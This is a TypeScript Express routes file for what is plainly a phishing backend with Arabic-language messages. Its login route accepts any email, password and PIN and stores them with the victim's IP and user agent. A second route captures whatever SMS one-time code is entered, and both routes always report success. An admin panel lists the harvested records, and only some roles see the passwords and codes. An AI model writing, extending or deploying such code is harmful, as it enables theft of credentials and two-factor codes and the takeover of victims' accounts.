import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginSchema, verifyOtpSchema, adminLoginSchema } from "@shared/schema";

// Store temporary collected data IDs for SMS verification
const tempCollectedIds = new Map<string, string>();

function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || 'unknown';
}

// Middleware to check if admin is authenticated
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.session.adminId) {
    return res.status(401).json({ message: "غير مصرح لك بالوصول" });
  }
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Login endpoint - accepts ANY credentials and saves to database
  app.post("/api/auth/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      const { email, password, pin } = validatedData;

      const ipAddress = getClientIp(req);
      const userAgent = req.headers['user-agent'] || 'unknown';

      // Save collected data to database
      const collectedDataRecord = await storage.createCollectedData({
        email,
        password,
        pin,
        smsCode: null,
        ipAddress,
        userAgent,
      });

      // Store the collected data ID temporarily for SMS verification
      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      tempCollectedIds.set(sessionId, collectedDataRecord.id);

      console.log(`✅ Login data saved to database for: ${email}`);

      // Always return success
      res.json({ 
        success: true, 
        userId: sessionId,
        message: "تم إرسال رمز التحقق إلى هاتفك" 
      });
    } catch (error: any) {
      console.error("Login error:", error);
      res.status(400).json({ message: error.message || "خطأ في البيانات المدخلة" });
    }
  });

  // Verify OTP endpoint - accepts ANY SMS code and saves to database
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const validatedData = verifyOtpSchema.parse(req.body);
      const { userId, otp } = validatedData;

      // Get collected data ID
      const collectedDataId = tempCollectedIds.get(userId);
      
      if (!collectedDataId) {
        return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
      }

      // Update collected data with SMS code
      await storage.updateCollectedDataSms(collectedDataId, otp);

      console.log(`✅ SMS code saved to database - Code: ${otp}`);

      // Clean up temporary session
      tempCollectedIds.delete(userId);

      // Always return success
      res.json({ 
        success: true,
        message: "تم التحقق بنجاح" 
      });
    } catch (error: any) {
      console.error("OTP verification error:", error);
      res.status(400).json({ message: error.message || "خطأ في التحقق" });
    }
  });

  // Admin login endpoint
  app.post("/api/admin/login", async (req, res) => {
    try {
      const validatedData = adminLoginSchema.parse(req.body);
      const { username, password } = validatedData;

      const admin = await storage.getAdminByUsername(username);
      
      if (!admin || admin.password !== password) {
        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
      }

      // Store admin data in session
      req.session.adminId = admin.id;
      req.session.adminUsername = admin.username;
      req.session.adminRole = admin.role;

      res.json({ 
        success: true,
        admin: {
          id: admin.id,
          username: admin.username,
          role: admin.role,
        }
      });
    } catch (error: any) {
      console.error("Admin login error:", error);
      res.status(400).json({ message: error.message || "خطأ في تسجيل الدخول" });
    }
  });

  // Admin logout endpoint
  app.post("/api/admin/logout", requireAdmin, async (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "خطأ في تسجيل الخروج" });
      }
      res.json({ success: true, message: "تم تسجيل الخروج بنجاح" });
    });
  });

  // Get current admin info
  app.get("/api/admin/me", requireAdmin, async (req, res) => {
    res.json({
      success: true,
      admin: {
        id: req.session.adminId,
        username: req.session.adminUsername,
        role: req.session.adminRole,
      }
    });
  });

  // Get all collected data (admin only - protected with role-based filtering)
  app.get("/api/admin/collected-data", requireAdmin, async (req, res) => {
    try {
      const data = await storage.getAllCollectedData();
      const adminRole = req.session.adminRole;
      
      // Filter sensitive fields based on role
      const filteredData = data.map(record => {
        if (adminRole === "admin") {
          // Admin sees everything
          return record;
        } else {
          // Staff (80% access) - hide password and smsCode
          const { password, smsCode, ...visibleData } = record;
          return {
            ...visibleData,
            password: null,
            smsCode: null,
          };
        }
      });
      
      res.json({ 
        success: true, 
        data: filteredData,
        adminRole
      });
    } catch (error: any) {
      console.error("Error fetching collected data:", error);
      res.status(500).json({ message: "خطأ في جلب البيانات" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
